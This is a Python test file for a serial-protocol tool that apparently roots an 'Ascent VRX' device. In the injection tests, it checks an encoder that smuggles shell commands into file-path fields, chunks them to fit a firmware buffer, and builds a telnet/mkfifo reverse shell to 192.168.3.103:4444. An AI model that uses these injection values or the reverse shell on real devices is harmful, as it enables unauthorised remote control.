"""Tests for the serial protocol and the command-injection encoder."""

from __future__ import annotations

import hashlib
import re
import struct
import unittest
from unittest import mock

from ascent_root import protocol

DATA_RE = re.compile(
    r"^/tmp/;echo -n '(?P<chunk>.*?)'(?P<redirect>>>|>)\$\(pwd\|cut -c1\)"
    r"tmp\$\(pwd\|cut -c1\)e$"
)
SLASH_RE = re.compile(
    r"^/tmp/;P=\$\(pwd\|cut -c1\); echo -n \$\{P\} (?P<redirect>>>|>) "
    r"\$\{P\}tmp\$\{P\}e$"
)


def make_device_info_payload() -> bytes:
    payload = bytearray(300)
    struct.pack_into("<i", payload, 0, 1024 * 1024)
    payload[4:36] = b"1.2.3".ljust(32, b"\x00")
    payload[36:100] = b"Ascent_VRX_Max".ljust(64, b"\x00")
    struct.pack_into("<i", payload, 100, 42)
    payload[104:168] = b"16.5.7".ljust(64, b"\x00")
    payload[168:200] = b"SN123456".ljust(32, b"\x00")
    payload[200:232] = b"HW-1".ljust(32, b"\x00")
    struct.pack_into("<i", payload, 232, 0)
    payload[236:300] = b"OK".ljust(64, b"\x00")
    return bytes(payload)


class PacketTests(unittest.TestCase):
    def test_header_layout_and_crc(self) -> None:
        packet = protocol.build_packet(0x73, 7, b"abc", 1)
        self.assertEqual(packet[:4], b"OTRA")
        self.assertEqual(len(packet), protocol.HEADER_SIZE + 3)

        proto, magic2, command, fmt = struct.unpack_from("<IIII", packet, 4)
        self.assertEqual(proto, protocol.PROTO_VERSION)
        self.assertEqual(magic2, protocol.MAGIC2)
        self.assertEqual(command, 0x73)
        self.assertEqual(fmt, protocol.FORMAT)

        payload_len, sequence, arg, _crc = struct.unpack_from("<IIII", packet, 20)
        self.assertEqual(payload_len, 3)
        self.assertEqual(sequence, 7)
        self.assertEqual(arg, 1)

        self.assertTrue(protocol.verify_crc(packet[:36], packet[36:]))
        corrupted = bytearray(packet)
        corrupted[-1] ^= 0xFF
        self.assertFalse(protocol.verify_crc(bytes(corrupted[:36]), bytes(corrupted[36:])))

    def test_parse_header_roundtrip(self) -> None:
        packet = protocol.build_packet(0x74, 9, b"xyz", 0)
        info = protocol.parse_header(packet[: protocol.HEADER_SIZE])
        self.assertEqual(info["cmd"], 0x74)
        self.assertEqual(info["seq"], 9)
        self.assertEqual(info["payload_len"], 3)
        self.assertEqual(info["magic"], protocol.MAGIC)

    def test_file_info_payload(self) -> None:
        content = b"abc\n"
        payload = protocol.build_file_info_payload(content, "/tmp/;sleep 1", "image.img")
        self.assertEqual(len(payload), 328)
        self.assertEqual(
            payload[:64].split(b"\x00")[0].decode(),
            hashlib.md5(content).hexdigest(),
        )
        self.assertEqual(struct.unpack_from("<I", payload, 64)[0], len(content))
        self.assertEqual(struct.unpack_from("<I", payload, 68)[0], 1)
        self.assertTrue(payload[72:200].startswith(b"/tmp/;sleep 1\x00"))

    def test_device_info_parser(self) -> None:
        info = protocol.parse_device_info(make_device_info_payload())
        self.assertEqual(info.receive_max_size, 1024 * 1024)
        self.assertEqual(info.sdk_version, "1.2.3")
        self.assertEqual(info.device_name, "Ascent_VRX_Max")
        self.assertEqual(info.cpu_temp, 42)
        self.assertEqual(info.firmware_info, "16.5.7")
        self.assertEqual(info.serial_number, "SN123456")
        self.assertEqual(info.hardware_version, "HW-1")
        self.assertEqual(info.status, 0)
        self.assertEqual(info.detail, "OK")
        self.assertTrue(info.looks_like_vrx)

    def test_short_device_info_rejected(self) -> None:
        with self.assertRaises(protocol.ProtocolError):
            protocol.parse_device_info(b"\x00" * 100)

    def test_response_shapes(self) -> None:
        progress = struct.pack("<IIII", 4, 4, 4, 0) + b"OK\x00"
        response = protocol.AscentLink._make_response(
            {"cmd": protocol.CMD_FILE_DATA, "seq": 3}, progress
        )
        self.assertEqual(response.written, 4)
        self.assertEqual(response.current_size, 4)
        self.assertEqual(response.total_size, 4)
        self.assertEqual(response.detail, "OK")

        status = struct.pack("<i", 0) + b"OK\x00"
        response = protocol.AscentLink._make_response(
            {"cmd": protocol.CMD_RESET_SESSION, "seq": 1}, status
        )
        self.assertEqual(response.status, 0)
        self.assertEqual(response.detail, "OK")


class InjectionTests(unittest.TestCase):
    def test_reverse_shell_is_busybox_friendly(self) -> None:
        command = protocol.build_reverse_shell_command("192.168.3.103", 4444)
        self.assertNotIn("'", command)
        self.assertIn('tr -d "\\r"', command)
        self.assertIn("/bin/sh -i", command)
        self.assertIn("telnet 192.168.3.103 4444", command)
        self.assertTrue(command.startswith("rm -f /tmp/f; mkfifo /tmp/f;"))

    def test_steps_rebuild_the_command_exactly(self) -> None:
        command = protocol.build_reverse_shell_command("192.168.3.103", 4444)
        steps = protocol.build_injection_steps(command)
        self.assertTrue(steps[-1].is_launcher)

        rebuilt = ""
        first = True
        for step in steps[:-1]:
            if step.kind == "slash":
                match = SLASH_RE.match(step.path)
                self.assertIsNotNone(match, step.path)
                assert match is not None
                self.assertEqual(match.group("redirect"), ">" if first else ">>")
                rebuilt += "/"
            else:
                match = DATA_RE.match(step.path)
                self.assertIsNotNone(match, step.path)
                assert match is not None
                self.assertEqual(match.group("redirect"), ">" if first else ">>")
                if first:
                    rebuilt = ""
                rebuilt += match.group("chunk")
            first = False

        self.assertEqual(rebuilt, command)

    def test_steps_fit_the_firmware_buffer(self) -> None:
        command = protocol.build_reverse_shell_command("192.168.3.103", 4444)
        steps = protocol.build_injection_steps(command)
        self.assertGreater(len(steps), 5)
        for step in steps:
            self.assertLessEqual(len(step.path), protocol.MAX_INJECT_PATH)
            # "md5sum " + path + NUL must fit in a 64-byte snprintf buffer.
            self.assertLessEqual(len(step.path) + 7 + 1, 64)

    def test_single_quote_is_rejected(self) -> None:
        with self.assertRaises(ValueError):
            protocol.build_injection_steps("echo 'nope'")

    def test_newline_is_rejected(self) -> None:
        with self.assertRaises(ValueError):
            protocol.build_injection_steps("echo a\necho b")

    def test_first_write_truncates_the_file(self) -> None:
        steps = protocol.build_injection_steps("abc/def")
        self.assertIn("'>$(", steps[0].path)
        slash_steps = [step for step in steps if step.kind == "slash"]
        self.assertEqual(len(slash_steps), 1)
        self.assertIn(">>", slash_steps[0].path)


class FakeSerial:
    """Minimal pyserial stand-in for protocol tests."""

    def __init__(self, incoming: bytes = b"") -> None:
        self.incoming = bytearray(incoming)
        self.written = bytearray()
        self.is_open = True

    def read(self, size: int) -> bytes:
        chunk = self.incoming[:size]
        del self.incoming[:size]
        return bytes(chunk)

    def write(self, data: bytes) -> int:
        self.written.extend(data)
        return len(data)

    def flush(self) -> None:
        pass

    def reset_input_buffer(self) -> None:
        pass

    def reset_output_buffer(self) -> None:
        pass


class LinkTests(unittest.TestCase):
    def test_read_response(self) -> None:
        payload = make_device_info_payload()
        packet = protocol.build_packet(protocol.CMD_GET_DEVICE_INFO, 1, payload)
        link = protocol.AscentLink("FAKE")
        link._ser = FakeSerial(packet)

        response = link._read_response(protocol.CMD_GET_DEVICE_INFO, 1, 1.0)
        self.assertIsNotNone(response)
        assert response is not None
        self.assertEqual(response.payload, payload)

    def test_send_request_and_device_info(self) -> None:
        payload = make_device_info_payload()
        response_packet = protocol.build_packet(protocol.CMD_GET_DEVICE_INFO, 1, payload)
        link = protocol.AscentLink("FAKE")
        fake = FakeSerial(response_packet)
        link._ser = fake

        info = link.get_device_info(timeout=1.0, retries=0)
        self.assertEqual(info.device_name, "Ascent_VRX_Max")
        self.assertEqual(fake.written[:4], protocol.MAGIC)
        command = struct.unpack_from("<I", fake.written, 12)[0]
        sequence = struct.unpack_from("<I", fake.written, 24)[0]
        self.assertEqual(command, protocol.CMD_GET_DEVICE_INFO)
        self.assertEqual(sequence, 1)

    def test_bad_crc_response_times_out(self) -> None:
        packet = bytearray(
            protocol.build_packet(protocol.CMD_RESET_SESSION, 1, struct.pack("<i", 0) + b"OK\x00")
        )
        packet[-1] ^= 0xFF
        link = protocol.AscentLink("FAKE")
        link._ser = FakeSerial(bytes(packet))
        with self.assertRaises(protocol.SerialTimeout):
            link._read_response(protocol.CMD_RESET_SESSION, 1, 0.15)

    def test_stale_sequence_is_ignored(self) -> None:
        stale = protocol.build_packet(
            protocol.CMD_RESET_SESSION, 99, struct.pack("<i", 0) + b"OK\x00"
        )
        fresh = protocol.build_packet(
            protocol.CMD_RESET_SESSION, 7, struct.pack("<i", 0) + b"OK\x00"
        )
        link = protocol.AscentLink("FAKE")
        link._ser = FakeSerial(stale + fresh)
        response = link._read_response(protocol.CMD_RESET_SESSION, 7, 1.0)
        self.assertIsNotNone(response)
        assert response is not None
        self.assertEqual(response.sequence, 7)


class ReconnectingInjectionTests(unittest.TestCase):
    def test_each_step_opens_and_closes_the_port(self) -> None:
        connections: list[str] = []

        class Link:
            def __init__(self, port: str, baudrate: int = 115200, log=None) -> None:
                self.port = port

            def open(self) -> None:
                connections.append(f"open {self.port}")

            def close(self) -> None:
                connections.append(f"close {self.port}")

            def reset_buffers(self) -> None:
                pass

        with (
            mock.patch.object(protocol, "AscentLink", Link),
            mock.patch.object(protocol, "write_injection_step") as write_step,
            mock.patch.object(protocol.time, "sleep") as sleep,
        ):
            steps = protocol.inject_command_reconnecting("COM5", "abc/def")

        self.assertEqual(write_step.call_count, len(steps))
        self.assertEqual(
            connections,
            ["open COM5", "close COM5"] * len(steps),
        )
        sleep.assert_called()


class PortScoringTests(unittest.TestCase):
    def test_ascent_usb_ids_score_high(self) -> None:
        port = protocol.PortInfo(
            device="COM5",
            description="USB Serial Device (COM5)",
            hwid="USB VID:PID=1D77:A4A2",
            vid=0x1D77,
            pid=0xA4A2,
        )
        self.assertGreaterEqual(protocol.port_score(port), 100)

    def test_bluetooth_scores_low(self) -> None:
        port = protocol.PortInfo(
            device="COM7",
            description="Standard Serial over Bluetooth link (COM7)",
            hwid="BTHENUM\\{00001101-0000-1000-8000-00805F9B34FB}_LOCALMFG&0000",
        )
        self.assertLess(protocol.port_score(port), 0)

    def test_unknown_port_scores_zero(self) -> None:
        port = protocol.PortInfo(device="COM9", description="Communications Port (COM9)")
        self.assertEqual(protocol.port_score(port), 0)


if __name__ == "__main__":
    unittest.main()
